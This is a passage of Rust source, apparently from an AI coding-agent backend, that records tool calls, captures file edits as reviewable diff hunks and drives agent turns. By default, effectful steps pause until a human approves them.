    norm.contains("pass")
        || norm.contains("verify")
        || norm.contains("verification")
        || norm.contains("green")
        || norm.contains("test")
}

/// The recorder every dispatch reports to.
///
/// It hangs off the [`ToolDispatcher`] itself, so the kernel agent (which holds the dispatcher
/// directly), the editor save and anything added later all produce the SAME record: the durable
/// `tool.call`/`tool.result` pair the timeline and transcript search read, the live `ToolProgress`,
/// and - for a write - the addressable [`DiffProposal`] the hunk review surface, the checkpoint's
/// `repo_state` coverage and the code rewind all read. This used to live in a host wrapper that
/// exactly one production caller passed a run to, so an agent edit produced none of it.
pub(crate) struct DispatchRecorder {
    services: SharedBackend,
    ui_bus: Arc<UiEventBus>,
    /// Attribution fixed at construction, for a dispatcher built for ONE task (the turn kernel's).
    /// Unset on the host's shared dispatcher, which serves every session and reads the ambient
    /// [`crate::tools::dispatch_context`] instead.
    bound: Option<crate::tools::DispatchContext>,
}

/// The tools that WRITE the workspace, whose pre/post image is captured as a reviewable hunk.
fn writes_workspace(tool: &str) -> bool {
    tool.starts_with("edit.") || tool == "fs.write"
}

impl DispatchRecorder {
    pub(crate) fn new(services: SharedBackend, ui_bus: Arc<UiEventBus>) -> Self {
        Self {
            services,
            ui_bus,
            bound: None,
        }
    }

    /// A recorder for one task's dispatcher: every call through it is that session's and that
    /// run's, whatever task polls it (a task-local would not survive the kernel spawning one).
    pub(crate) fn bound_to(
        services: SharedBackend,
        ui_bus: Arc<UiEventBus>,
        bound: crate::tools::DispatchContext,
    ) -> Self {
        Self {
            services,
            ui_bus,
            bound: Some(bound),
        }
    }

    /// Who this call is for. An unattributed dispatch is still RECORDED (against the default
    /// session, ungrouped) rather than silently vanishing.
    fn context(&self) -> crate::tools::DispatchContext {
        self.bound
            .clone()
            .or_else(crate::tools::dispatch_context)
            .unwrap_or_else(|| crate::tools::DispatchContext {
                session_id: self.services.session(),
                run_id: None,
            })
    }

    /// The ONE spelling rule for a written path: absolute to touch the file, workspace-relative to
    /// RECORD it. Every downstream consumer (the diff store, `rewind::code_state`, the checkpoint
    /// coverage digest, and the verification receipts, whose scope is workspace-relative) then
    /// compares one spelling instead of two that can never match.
    fn locate(&self, path: &str) -> (PathBuf, String) {
        let root = &self.services.config.workspace_root;
        let raw = Path::new(path);
        let abs = if raw.is_absolute() {
            raw.to_path_buf()
        } else {
            root.join(raw)
        };
        let rel = workspace_relative(root, &abs);
        (abs, rel)
    }

    /// Record the applied call. Returns an error only for a storage failure; the caller surfaces it
    /// (the dispatch itself already happened, so it is never rolled back).
    async fn record(
        &self,
        call: &ToolCall,
        before: Option<Value>,
        result: &ToolResult,
    ) -> Result<()> {
        let ctx = self.context();
        let mut call_new = NewEvent::tool_call(
            ctx.session_id.clone(),
            ToolCallEvent {
                call_id: call.call_id.clone(),
                tool_name: call.tool.clone(),
                capability_grant_id: call.capability_grant_id.clone(),
                args: call.args.clone(),
                predicted_effects: result.effects.clone(),
            },
        );
        call_new.run_id = ctx.run_id.clone();
        let call_event_record = self.services.event_log.append(call_new).await?;
        // The tool.result Observation pairs back to the tool.call Action via `cause`
        // (T3 Action/Observation replay pairing).
        let mut result_new = NewEvent::tool_result(
            ctx.session_id.clone(),
            ToolResultEvent {
                call_id: result.call_id.clone(),
                ok: result.status == ToolStatus::Ok,
                summary: tool_result_summary(result),
                output: result.structured_content.clone(),
                bytes_ref: result.bytes_ref.clone(),
            },
        );
        result_new.run_id = ctx.run_id.clone();
        result_new.cause = Some(call_event_record.id);
        let result_event = self.services.event_log.append(result_new).await?;
        self.services.projection_store.put_projection(
            &result_event.session_id,
            result_event.seq,
            json!({
                "projection": "last_tool_result",
                "tool_status": result.status,
                "tool_output": result.structured_content.clone(),
            }),
        )?;
        // Push the tool progress onto the live Wire-B bus (in addition to the durable log the pull
        // API replays from).
        self.ui_bus.publish(UiEvent {
            seq: result_event.seq,
            session_id: Some(result_event.session_id.clone()),
            kind: UiEventKind::ToolProgress {
                call_id: result.call_id.as_str().to_string(),
                message: if result.status == ToolStatus::Ok {
                    tool_result_summary(result)
                } else {
                    format!("failed: {}", tool_result_summary(result))
                },
                // The RECORDED event this step is, so a timeline can address it as a boundary.
                // `seq_of_event` resolves exactly this id.
                event_id: Some(result_event.id.as_str().to_string()),
            },
        });
        // Register the applied write as an addressable diff hunk (census sec 23): the
        // immediate-apply flow already wrote to disk, so we read the post-image and record
        // before/after for later per-hunk keep or revert. Grouped by the run, so an unattributed
        // dispatch records its events and no hunk (there is nothing to group it under).
        if let (Some(pre), Some(run)) = (before, ctx.run_id.as_ref()) {
            if result.status == ToolStatus::Ok {
                let abs = pre.get("abs").and_then(|v| v.as_str()).unwrap_or_default();
                let file = pre.get("file").and_then(|v| v.as_str()).unwrap_or_default();
                let text = pre.get("before").and_then(|v| v.as_str()).unwrap_or_default();
                let after = std::fs::read_to_string(abs).unwrap_or_default();
                if after != text {
                    self.record_edit_diff(
                        &ctx.session_id,
                        run,
                        &call.tool,
                        file.to_string(),
                        text.to_string(),
                        after,
                    )
                    .await?;
                }
            }
        }
        Ok(())
    }

    async fn record_edit_diff(
        &self,
        session_id: &SessionId,
        run_id: &RunId,
        tool_name: &str,
        file: String,
        before: String,
        after: String,
    ) -> Result<()> {
        let kv = &self.services.key_value_store;
        let diff_id = format!("diff-{}", run_id.as_str());
        let mut proposal = DiffStore::get(kv, &diff_id).unwrap_or_else(|| DiffProposal {
            diff_id: diff_id.clone(),
            run_id: run_id.as_str().to_string(),
            session_id: session_id.clone(),
            created_ms: hide_core::ids::now_ms(),
            created_from: DiffProvenance {
                plan_step: None,
                agent: tool_name.to_string(),
                turn: 0,
            },
            hunks: Vec::new(),
        });
        let turn = proposal.hunks.len() as u64;
        let base_hash = blake3::hash(before.as_bytes()).to_hex().to_string();
        proposal.hunks.push(DiffHunk {
            hunk_id: format!("{diff_id}-h{turn}"),
            file,
            base_hash,
            before,
            after,
            status: HunkStatus::Pending,
            provenance: DiffProvenance {
                plan_step: None,
                agent: tool_name.to_string(),
                turn,
            },
        });
        DiffStore::put(kv, &proposal)?;
        self.services
            .event_log
            .append(NewEvent::system(
                session_id.clone(),
                "diff.proposed",
                serde_json::to_value(&proposal).unwrap_or(Value::Null),
            ))
            .await?;
        publish_diff_to(&self.ui_bus, &proposal);
        Ok(())
    }
}

impl hide_core::tool::DispatchObserver for DispatchRecorder {
    fn before(&self, call: &ToolCall) -> Option<Value> {
        if !writes_workspace(&call.tool) {
            return None;
        }
        let path = call.args.get("path").and_then(|v| v.as_str())?;
        let (abs, rel) = self.locate(path);
        Some(json!({
            "abs": abs.to_string_lossy(),
            "file": rel,
            "before": std::fs::read_to_string(&abs).unwrap_or_default(),
        }))
    }

    fn after<'a>(
        &'a self,
        call: &'a ToolCall,
        before: Option<Value>,
        result: &'a ToolResult,
    ) -> futures::future::BoxFuture<'a, ()> {
        Box::pin(async move {
            if let Err(err) = self.record(call, before, result).await {
                // The tool already ran; a recording failure must be visible, not swallowed.
                self.ui_bus.publish(UiEvent {
                    seq: 0,
                    session_id: None,
                    kind: UiEventKind::Error {
                        code: "dispatch_record".to_string(),
                        message: err.to_string(),
                    },
                });
            }
        })
    }
}

/// A path spelled relative to the workspace root when it is inside it, unchanged otherwise.
fn workspace_relative(root: &Path, path: &Path) -> String {
    path.strip_prefix(root)
        .unwrap_or(path)
        .to_string_lossy()
        .into_owned()
}

/// Publish the two diff projections the review surface reads. Free of the host so the recorder
/// hanging off the dispatcher publishes through exactly the same producer.
fn publish_diff_to(ui_bus: &UiEventBus, proposal: &DiffProposal) {
    let (diff, chips) = diff_projections(proposal);
    for (projection, patch) in [("diff", diff), ("diff_chip", chips)] {
        ui_bus.publish(UiEvent {
            seq: 0,
            session_id: Some(proposal.session_id.clone()),
            kind: UiEventKind::ProjectionPatch {
                projection: projection.to_string(),
                patch,
            },
        });
    }
}

/// True if two path scopes share any file/directory, using hide-verify's
/// containment-aware [`paths_intersect`](hide_verify::paths_intersect) semantics
/// (a directory scope intersects a file it contains). Drives the authority
/// reconciliation in [`BackendHost::reconcile_review_for_scope`] so a review is
/// only weighed against deterministic receipts for the SAME scope.
fn scopes_intersect(a: &[String], b: &[String]) -> bool {
    a.iter()
        .any(|x| b.iter().any(|y| hide_verify::paths_intersect(x, y)))
}

fn unknown_diff(diff_id: &str) -> hide_core::error::HideError {
    hide_core::error::HideError::Message(format!("unknown diff {diff_id}"))
}

fn unknown_hunk(hunk_id: &str) -> hide_core::error::HideError {
    hide_core::error::HideError::Message(format!("unknown hunk {hunk_id}"))
}

fn unknown_repo(repo_id: &str) -> hide_core::error::HideError {
    hide_core::error::HideError::NotFound(format!("unknown repo {repo_id}"))
}

/// Which lease a revocation trigger applies to. A trigger that names a run or a repo revokes only
/// a lease that belongs to it, so another task's cancellation cannot take this task's lease away.
enum LeaseRevokeScope {
    Any,
    Run(String),
    Repo(String),
}

impl LeaseRevokeScope {
    fn revoke(&self) -> Option<crate::tools::WriteLease> {
        match self {
            Self::Any => crate::tools::revoke_write_lease("revoked"),
            Self::Run(run) => crate::tools::revoke_write_lease_for_run(run, None),
            Self::Repo(repo) => crate::tools::revoke_write_lease_for_repo(repo),
        }
    }
}

/// Publish the write lease onto the EXISTING `status` projection the status bar already routes.
///
/// A free function because the run-completion revoke fires from the kernel turn driver, which holds
/// the bus but not the host. `active: false` is published on revoke so the bar clears rather than
/// keeping a lease on screen that no longer exists.
pub(crate) fn publish_write_lease(
    ui_bus: &UiEventBus,
    lease: Option<&crate::tools::WriteLease>,
    note: &str,
) {
    ui_bus.publish(UiEvent {
        seq: 0,
        session_id: None,
        kind: UiEventKind::ProjectionPatch {
            projection: "status".to_string(),
            patch: write_lease_patch(lease, note),
        },
    });
}

/// The `status` projection patch a write lease renders as. ONE shape, because the lease reaches a
/// client two ways: the live publish above, and the fresh-client read the home connector serves
/// (`connectors::HomeConnector`). It is a process-global static held in memory only, never a durable
/// event, so a reloaded tab could not learn about a lease that was still being honoured; a replayed
/// grant/revoke pair would have been worse, since the static does not survive a host restart and the
/// log would claim a lease nothing holds.
pub(crate) fn write_lease_patch(
    lease: Option<&crate::tools::WriteLease>,
    note: &str,
) -> serde_json::Value {
    json!({
        "write_lease": {
            "active": lease.is_some(),
            "note": note,
            "lease_id": lease.map(|l| l.lease_id.clone()),
            "repo_id": lease.map(|l| l.repo_id.clone()),
            "scopes": lease.map(|l| l
                .scopes
                .iter()
                .map(|s| s.display().to_string())
                .collect::<Vec<_>>())
                .unwrap_or_default(),
            "granted_ms": lease.map(|l| l.granted_ms),
        }
    })
}

// --- The diff projection the FE actually reads (census sec 23) ---
//
// app/src/surfaces/ide/types.ts folds `projection_patch{projection:"diff"}` into a
// DiffDoc {diff_id, run_id, path, lang, before, after, hunks[{id, header, lines, status}]}
// and app/src/surfaces/chat/parts.ts folds `{projection:"diff_chip"}` into
// {chips:[{diff_id, path, added, removed, status}]}. The host record is per RUN and
// spans files, the view model names ONE file, so the host adapts:
//   * `hunks` carries EVERY hunk of the run (each also keeping the wire fields the
//     review reads back: hunk_id, file, base_hash, provenance), so review is never
//     silently narrowed to one file;
//   * `path`/`before`/`after` name the most recently edited file, which is what the
//     side-by-side Monaco model is built from.
// `stale` is not published: the record has no disk read, so it would be a guess.
// ponytail: no on-disk drift check. Publish `stale` when the host reads the file's
// current hash back at publish time.

/// How many unchanged lines are kept either side of the changed block.
const DIFF_CONTEXT_LINES: usize = 3;

/// Monaco language id from a file extension. Unknown extensions read as plaintext
/// rather than as a guess that would syntax-colour the wrong grammar.
fn monaco_language(file: &str) -> &'static str {
    match file.rsplit('.').next().unwrap_or("") {
        "rs" => "rust",
        "ts" | "tsx" => "typescript",
        "js" | "jsx" => "javascript",
        "json" => "json",
        "md" => "markdown",
        "py" => "python",
        "toml" => "toml",
        "yaml" | "yml" => "yaml",
        "html" => "html",
        "css" => "css",
        "sh" => "shell",
        _ => "plaintext",
    }
}

/// Fold one hunk's whole-file pre/post images into the FE's line view: common
/// leading and trailing lines are context, the middle is the removed block then the
/// added block. Returns the lines, the `@@` header and the (added, removed) counts.
///
/// ponytail: prefix/suffix trim, not an LCS diff, so an edit that touches two far
/// apart regions of one file reads as a single wide block. hide-backend does not
/// depend on `similar`; wire it in if per-region hunks are wanted.
fn hunk_line_view(file: &str, before: &str, after: &str) -> (Vec<Value>, String, usize, usize) {
    let old: Vec<&str> = before.lines().collect();
    let new: Vec<&str> = after.lines().collect();
    let mut pre = 0;
    while pre < old.len() && pre < new.len() && old[pre] == new[pre] {
        pre += 1;
    }
    let mut suf = 0;
    while suf < old.len() - pre
        && suf < new.len() - pre
        && old[old.len() - 1 - suf] == new[new.len() - 1 - suf]
    {
        suf += 1;
    }
    let old_mid = &old[pre..old.len() - suf];
    let new_mid = &new[pre..new.len() - suf];
    let ctx = |text: &str, o: usize, n: usize| {
        json!({ "kind": "ctx", "text": text, "oldNo": o, "newNo": n })
    };
    let mut lines: Vec<Value> = Vec::new();
    for i in pre.saturating_sub(DIFF_CONTEXT_LINES)..pre {
        lines.push(ctx(old[i], i + 1, i + 1));
    }
    for (i, text) in old_mid.iter().enumerate() {
        lines.push(json!({ "kind": "del", "text": text, "oldNo": pre + i + 1, "newNo": null }));
    }
    for (i, text) in new_mid.iter().enumerate() {
        lines.push(json!({ "kind": "add", "text": text, "oldNo": null, "newNo": pre + i + 1 }));
    }
    for k in 0..suf.min(DIFF_CONTEXT_LINES) {
        lines.push(ctx(
            old[old.len() - suf + k],
            old.len() - suf + k + 1,
            new.len() - suf + k + 1,
        ));
    }
    let header = format!(
        "@@ -{},{} +{},{} @@ {file}",
        pre + 1,
        old_mid.len(),
        pre + 1,
        new_mid.len()
    );
    (lines, header, new_mid.len(), old_mid.len())
}

/// The `(diff, diff_chip)` projection patches for a proposal. Shared by the live
/// publish and by the reconnect replay so both surfaces see the SAME shape.
pub(crate) fn diff_projections(proposal: &DiffProposal) -> (Value, Value) {
    let mut hunks: Vec<Value> = Vec::new();
    // file -> (added, removed, any_pending, any_kept)
    let mut per_file: Vec<(String, usize, usize, bool, bool)> = Vec::new();
    for h in &proposal.hunks {
        let (lines, header, added, removed) = hunk_line_view(&h.file, &h.before, &h.after);
        let status = match h.status {
            HunkStatus::Pending => "pending",
            HunkStatus::Accepted => "accepted",
            HunkStatus::Rejected => "rejected",
        };
        hunks.push(json!({
            "id": h.hunk_id,
            "hunk_id": h.hunk_id,
            "file": h.file,
            "base_hash": h.base_hash,
            "header": header,
            "status": status,
            "lines": lines,
            "provenance": h.provenance,
        }));
        match per_file.iter_mut().find(|(f, ..)| *f == h.file) {
            Some(row) => {
                row.1 += added;
                row.2 += removed;
                row.3 |= h.status == HunkStatus::Pending;
                row.4 |= h.status != HunkStatus::Rejected;
            }
            None => per_file.push((
                h.file.clone(),
                added,
                removed,
                h.status == HunkStatus::Pending,
                h.status != HunkStatus::Rejected,
            )),
        }
    }
    let latest = proposal.hunks.last();
    let file = latest.map(|h| h.file.as_str()).unwrap_or("");
    // The Monaco model for that file: its FIRST pre-image and its LAST post-image, so
    // several edits to one file read as one before/after rather than as the last one alone.
    let before = proposal
        .hunks
        .iter()
        .find(|h| h.file == file)
        .map(|h| h.before.as_str())
        .unwrap_or("");
    let after = latest.map(|h| h.after.as_str()).unwrap_or("");
    let diff = json!({
        "diff_id": proposal.diff_id,
        "run_id": proposal.run_id,
        "path": file,
        "lang": monaco_language(file),
        "before": before,
        "after": after,
        "hunks": hunks,
    });
    let chips: Vec<Value> = per_file
        .iter()
        .map(|(f, added, removed, pending, kept)| {
            json!({
                "diff_id": proposal.diff_id,
                "run_id": proposal.run_id,
                "path": f,
                "added": added,
                "removed": removed,
                "status": if *pending { "proposed" } else if *kept { "applied" } else { "rejected" },
            })
        })
        .collect();
    (diff, json!({ "chips": chips }))
}

/// The spawnable twin of [`BackendHost::generate_and_publish`]: it takes owned
/// clones (so it is `'static` for `tokio::spawn`) and wires the run's `run_id`
/// into the [`InterruptHub`] so `CancelRun`/`PauseRun` reach it. A `CancelRun`
/// that lands before the (single-shot) HTTP generate fires aborts the run with
/// a `RuntimeStatus` notice rather than a fake completion.
#[allow(clippy::too_many_arguments)]
async fn generate_submit_turn(
    event_log: hide_core::persistence::DynEventLog,
    role_registry: Arc<hawking_orch::RoleRegistry>,
    code_index: Arc<dyn hawking_index::CodeIndex>,
    memory: crate::services::DynMemoryStore,
    ui_bus: Arc<UiEventBus>,
    interrupts: Arc<InterruptHub>,
    run_id: RunId,
    session_id: SessionId,
    base_url: String,
    prompt: String,
    repo_instructions: Arc<crate::compat_instructions::ResolvedInstructions>,
) -> Result<String> {
    use crate::model_provider::{HttpModelProvider, ModelProviderInferenceClient};
    use hide_kernel::govern::Interrupt;

    // Cooperative cancel: a CancelRun/PauseRun buffered for this run before we
    // start aborts cleanly (surfaced as a RuntimeStatus, not a fake token).
    if matches!(interrupts.take(&run_id), Some(Interrupt::Abort)) {
        ui_bus.publish(UiEvent {
            seq: 0,
            session_id: Some(session_id),
            kind: UiEventKind::RuntimeStatus {
                status: "cancelled".to_string(),
                detail: Some(format!(
                    "run {} cancelled before generation",
                    run_id.as_str()
                )),
            },
        });
        return Ok(String::new());
    }

    // W-F6-1: snapshot the live ceiling ONCE (before streaming) so the shared
    // core's sync token sink can emit a throttled per-step occupancy patch with
    // no per-token HTTP round-trip. The authoritative full `ManifestLive` patch
    // still fires post-turn (below).
    let live_snap = HttpModelProvider::new(base_url.clone())
        .get_context_info()
        .await
        .map(|i| {
            (
                i.recurrent_state_bytes,
                i.ctx_len_native,
                i.ctx_len_effective.or(i.ctx_len_native).unwrap_or(0),
            )
        });

    // The live model behind the uniform inference seam. Generation runs through
    // the SHARED `run_turn_core` so this path and `generate_and_publish` build the
    // IDENTICAL real request (compiled context + real history + a derived budget)
    // and can never drift.
    let inference: Arc<dyn hawking_orch::inference::InferenceClient> = Arc::new(
        ModelProviderInferenceClient::new(HttpModelProvider::new(base_url.clone())),
    );
    let outcome = run_turn_core(
        inference,
        event_log,
        role_registry,
        code_index,
        memory,
        ui_bus.clone(),
        session_id.clone(),
        prompt,
        live_snap,
        Some(run_id.as_str().to_string()),
        repo_instructions,
    )
    .await?;
    let buf = outcome.completion;
    let prompt_chars = outcome.prompt_chars;

    // Spine A: publish the live context_manifest the Context Stack reads. The
    // effective ceiling is the engine's measured `.tq` multiplier x native (read
    // live, never a constant). `used_tokens` here is a labeled per-turn estimate;
    // precise per-token occupancy arrives once the engine reports sequence position.
    {
        let ctx_provider = HttpModelProvider::new(base_url);
        if let Some(info) = ctx_provider.get_context_info().await {
            let ceiling = info.ctx_len_effective.or(info.ctx_len_native).unwrap_or(0);
            let used_est = (prompt_chars + buf.len()) / 4;
            // Spine A (W-F2-1): build a real `ManifestLive`. For an SSM (RWKV-7,
            // which reports a constant recurrent state) the regime is recall
            // FIDELITY -- "how sharp", via the calibratable probe -- not KV
            // saturation; the watermark bands then key off `1 - fidelity`.
            let live = build_live_manifest(
                info.recurrent_state_bytes,
                info.ctx_len_native,
                ceiling,
                used_est,
            );
            let mut live_json = serde_json::to_value(&live).unwrap_or_else(|_| json!({}));
            if let Some(obj) = live_json.as_object_mut() {
                obj.insert("used_tokens_estimate".to_string(), json!(used_est));
                obj.insert("estimated".to_string(), json!(true));
            }
            ui_bus.publish(UiEvent {
                seq: outcome.stream_seq,
                session_id: Some(session_id.clone()),
                kind: UiEventKind::ProjectionPatch {
                    projection: "context_manifest".to_string(),
                    patch: json!({
                        "model_id": info.model_id,
                        "arch": info.arch,
                        "ctx_len_native": info.ctx_len_native,
                        "ctx_len_effective": info.ctx_len_effective,
                        "tq_multiplier": info.tq_multiplier,
                        "tq_estimated": info.tq_estimated,
                        "recurrent_state_bytes": info.recurrent_state_bytes,
                        "active_slots": info.active_slots,
                        "free_slots": info.free_slots,
                        "live": live_json
                    }),
                },
            });
        }
    }
    Ok(buf)
}

/// Whether a live `SubmitTurn` routes through the real kernel loop (Increment 2)
/// or the single-shot [`run_turn_core`] fallback. Defaults OFF: the single-shot
/// path is complete-as-shipped (streams tokens, derives the budget, feeds
/// compiled context, rebuilds history in and out, persists the assistant turn).
/// Opt into the kernel turn (plan + tools + deterministic oracles) with
/// `HIDE_KERNEL_TURN=1` (also `on`/`true`/`yes`). The kernel path stays opt-in
/// until its approval round-trip (effectful-step resume) and answer surfacing
/// land, so nothing ships as a facade (Bible law 18).
fn kernel_turn_enabled() -> bool {
    matches!(
        std::env::var("HIDE_KERNEL_TURN").ok().as_deref(),
        Some("1") | Some("on") | Some("true") | Some("yes")
    )
}

/// The bounded autonomy a turn-kernel runs under. Defaults to the SAFE bounded
/// level ([`Autonomy::SuggestOnly`]): an effectful step pauses for approval
/// rather than running an unsandboxed shell unattended (never `FullAuto` by
/// default). `HIDE_KERNEL_AUTONOMY=full_auto` (or `read_only`) overrides it.
fn turn_kernel_autonomy() -> Autonomy {
    match std::env::var("HIDE_KERNEL_AUTONOMY").ok().as_deref() {
        Some("full_auto") | Some("full") => Autonomy::FullAuto,
        Some("read_only") | Some("readonly") => Autonomy::ReadOnly,
        _ => Autonomy::SuggestOnly,
    }
}

/// Step ceiling for a kernel-driven turn. Above the Governor's own `max_steps`
/// cap (default 80) so a runaway aborts *structurally* (K8) into a terminal
/// `Aborted` rather than the driver loop merely running out of iterations.
const DEFAULT_KERNEL_TURN_MAX_STEPS: usize = 128;

/// Increment 2: drive an accepted `SubmitTurn` through the REAL agent kernel
/// loop (fixing defect S1 - the host built [`AgentKernel::new`] = StubPlanner and
/// never used the wired [`AgentKernel::builder`]). This is the spawnable twin of
/// [`generate_submit_turn`]: it takes owned clones (so it is `'static`) plus the
/// pre-built `kernel` (from [`BackendHost::build_turn_kernel`]).
///
/// It (1) compiles a REAL `ContextPack` (bible §4.2) - the same recipe as
/// [`run_turn_core`] - (2) folds that compiled context into the run objective
/// (`objective = "{compiled}\n\n{prompt}"`), (3) calls
/// [`AgentKernel::start_run`] and loops [`AgentKernel::step`] until the phase is
/// terminal (bounded by `max_steps`), forwarding any `Cancel`/`Pause` the host
/// buffered for this run into `kernel.interrupt` each iteration, and (4)
/// publishes the post-turn `context_manifest` + a `turn` completion patch (Spine
/// A parity with the single-shot path). The driver
/// ([`hide_kernel::machine::driver`]) already persists `plan.created` /
/// `agent.action` / `agent.observation` / `verify.result` to the event log.
#[allow(clippy::too_many_arguments)]
async fn run_turn_kernel(
    kernel: AgentKernel,
    event_log: hide_core::persistence::DynEventLog,
    key_value_store: hide_core::persistence::DynKeyValueStore,
    role_registry: Arc<hawking_orch::RoleRegistry>,
    code_index: Arc<dyn hawking_index::CodeIndex>,
    memory: crate::services::DynMemoryStore,
    ui_bus: Arc<UiEventBus>,
    interrupts: Arc<InterruptHub>,
    approvals: Arc<ApprovalHub>,
    run_id: RunId,
    session_id: SessionId,
    base_url: String,
    prompt: String,
    max_steps: usize,
    repo_instructions: Arc<crate::compat_instructions::ResolvedInstructions>,
) -> Result<AgentState> {
    use crate::connectors::choose_context_role;
    use crate::model_provider::HttpModelProvider;
    use hawking_context::compiler::CompileInput;
    use hawking_context::profiles::ContextProfile;
    use hawking_context::sources::CodeIndexContextSource;
    use hawking_context::{ContextCompiler, InMemoryMemoryStore, MemoryKind};
    use hide_core::types::Provenance;

    // (Spine A) Snapshot the live ceiling ONCE (best-effort; `None` when the serve
    // is down or predates the context route) so the post-turn manifest is real.
    let live_snap = HttpModelProvider::new(base_url.clone())
        .get_context_info()
        .await
        .map(|i| {
            (
                i.recurrent_state_bytes,
                i.ctx_len_native,
                i.ctx_len_effective.or(i.ctx_len_native).unwrap_or(0),
            )
        });

    // --- (S3) Compile a REAL ContextPack - same recipe as `run_turn_core`. ---
    let role = choose_context_role(&role_registry, None)?;
    let max_input = role.model.context_tokens.max(4096);
    let mut compiler = ContextCompiler::new();
    compiler.add_source(CodeIndexContextSource::new(code_index, 16));
    // Bible sec 20 / sec 78.1 #11: fold the repo's resolved Claude Code migration
    // instructions into the compiled context as a pinned instruction source
    // (read-last-wins precedence). No-op for an un-migrated repo (resolves empty).
    if !repo_instructions.is_empty() {
        compiler.add_source(repo_instructions.as_source());
    }
    let compiled = compiler
        .compile(CompileInput {
            profile: ContextProfile::coding_default(max_input),
            model: role.model.clone(),
            task: prompt.clone(),
        })
        .await?;
    // Spine B (best-effort): accrue the Project Brain; a brain write never fails a turn.
    let brain = InMemoryMemoryStore::record(
        MemoryKind::Project,
        format!(
            "task: {prompt}\nkernel turn: retained {} spans, {} tokens used",
            compiled.manifest.retained.len(),
            compiled.manifest.used_tokens
        ),
        Provenance::trusted("submit_turn.kernel"),
    );
    let _ = memory.upsert(brain).await;

    // (F3) Rebuild REAL conversation history from the durable event log (the same
    // recipe as `run_turn_core`) and ensure the current user prompt is the final
    // user message. The live path logs `user.intent.submit_turn` before spawning,
    // so the current prompt is usually already present (we do NOT duplicate it);
    // headless callers pass a fresh prompt we append here. This threads prior
    // turns in so the kernel plans + acts with real multi-turn continuity.
    let mut messages = rebuild_history(&event_log, &session_id).await?;
    if messages
        .last()
        .map(|m| m.role != "user" || m.content != prompt)
        .unwrap_or(true)
    {
        messages.push(hide_core::runtime::InferenceMessage {
            role: "user".to_string(),
            content: prompt.clone(),
        });
    }
    let history_block = messages
        .iter()
        .map(|m| format!("{}: {}", m.role, m.content))
        .collect::<Vec<_>>()
        .join("\n");

    // (2) Fold the compiled context + rendered history into the run objective so
    // the planner + every step (and the durable `plan.created` event) are grounded
    // in real context AND prior turns.
    let objective = if compiled.prompt.trim().is_empty() {
        history_block
    } else {
        format!("{}\n\n{}", compiled.prompt, history_block)
    };
    let used_est = objective.len() / 4;

    // Durable marker (parity with the single-shot path): what the compiler
    // retained + the budget it left. Its seq keys the published UiEvents.
    let marker = event_log
        .append(NewEvent::system(
            session_id.clone(),
            "context.compiled",
            json!({
                "used_tokens": compiled.manifest.used_tokens,
                "retained": compiled.manifest.retained.len(),
                "path": "kernel",
                "run_id": run_id.as_str(),
            }),
        ))
        .await?;
    let seq = marker.seq;

    // Context receipt: which repo instruction files folded into this turn (parity
    // with the single-shot path). Logged only when the repo carried them.
    if !repo_instructions.is_empty() {
        event_log
            .append(NewEvent::system(
                session_id.clone(),
                "context.instructions",
                repo_instructions.receipt_json(),
            ))
            .await?;
    }

    // (Spine A) Publish a partial live manifest from the pre-run snapshot so the
    // Context Stack reflects the ceiling before the loop advances.
    if let Some((state_bytes, native, ceiling)) = live_snap {
        let live = build_live_manifest(state_bytes, native, ceiling, used_est);
        if let Ok(mut lj) = serde_json::to_value(&live) {
            if let Some(o) = lj.as_object_mut() {
                o.insert("used_tokens_estimate".to_string(), json!(used_est));
                o.insert("estimated".to_string(), json!(true));
                o.insert("partial".to_string(), json!(true));
            }
            ui_bus.publish(UiEvent {
                seq,
                session_id: Some(session_id.clone()),
                kind: UiEventKind::ProjectionPatch {
                    projection: "context_manifest".to_string(),
                    patch: json!({ "live": lj }),
                },
            });
        }
    }

    // (3) Drive the FSM to a terminal phase, forwarding host interrupts each step
    // and completing the effect+approval round-trip (§78.1 #7) when the driver
    // pauses on an effectful step under bounded autonomy.
    let mut state = kernel.start_run(session_id.clone(), objective).await?;
    // The step currently announced as awaiting approval (so the request surfaces
    // exactly once per pause, not on every idempotent Paused spin).
    let mut announced_approval: Option<StepId> = None;
    // Plan-domain emitter (Stage 1): publish the durable `plan` projection as the
    // plan evolves. `last_plan` de-dupes: we emit on the first synthesis and on
    // any change (step-status advance, replan), not on every idempotent spin.
    let plan_autonomy = turn_kernel_autonomy();
    let mut last_plan: Option<hide_kernel::plan::schema::Plan> = None;
    for _ in 0..max_steps {
        // Forward any Cancel/Pause the host buffered for this run into the kernel
        // (consumed by the Governor on the next transition, K8).
        interrupts.drain_into_kernel(&run_id, &kernel);
        if state.phase.is_terminal() {
            break;
        }
        kernel.step(&mut state).await?;

        // Publish + persist the plan projection whenever the live plan changes.
        // `store_and_publish` writes the durable KV record AND pushes the `plan`
        // ProjectionPatch on Wire-B, so the PlanCard and the mutation handlers
        // share one source of truth.
        if state.plan != last_plan {
            if let Some(plan) = &state.plan {
                let record = crate::plan_domain::PlanRecord::from_kernel(plan, plan_autonomy);
                if let Err(e) = crate::plan_domain::store_and_publish(
                    &key_value_store,
                    &ui_bus,
                    &session_id,
                    seq,
                    &record,
                ) {
                    ui_bus.publish(UiEvent {
                        seq,
                        session_id: Some(session_id.clone()),
                        kind: UiEventKind::Error {
                            code: "plan_projection".to_string(),
                            message: e.to_string(),
                        },
                    });
                }
            }
            last_plan = state.plan.clone();
        }

        // Effect+approval round-trip: while the driver holds the run at
        // `Phase::Paused` with a `pending_approval`, surface the request once and
        // deliver any host decision from the `ApprovalHub`. We NEVER auto-approve:
        // absent a decision the run stays paused (and eventually aborts on the
        // Governor's step cap), exactly as before.
        if state.phase == Phase::Paused {
            if let Some(request) = state.pending_approval.clone() {
                if announced_approval.as_ref() != Some(&request.step_id) {
                    announce_approval_request(
                        &event_log, &ui_bus, &session_id, &run_id, &request,
                    )
                    .await?;
                    announced_approval = Some(request.step_id.clone());
                }
                // Drain a decision for this run. A decision that names a different
                // step than the one pending is stale and ignored (re-buffered
                // decisions do not resurface, matching InterruptHub semantics).
                if let Some((step_id, decision)) = approvals.take(&run_id) {
                    let targets_pending = step_id
                        .as_ref()
                        .map(|s| s == &request.step_id)
                        .unwrap_or(true);
                    if targets_pending {
                        match decision {
                            ApprovalDecision::Approve => {
                                state.approve_pending_effect();
                            }
                            ApprovalDecision::Deny => {
                                state.deny_pending_effect();
                            }
                        }
                        record_approval_resolved(
                            &event_log, &session_id, &run_id, &request, decision,
                        )
                        .await?;
                        // A later effectful step re-announces (fresh step id).
                        announced_approval = None;
                    }
                }
            }
        }
    }

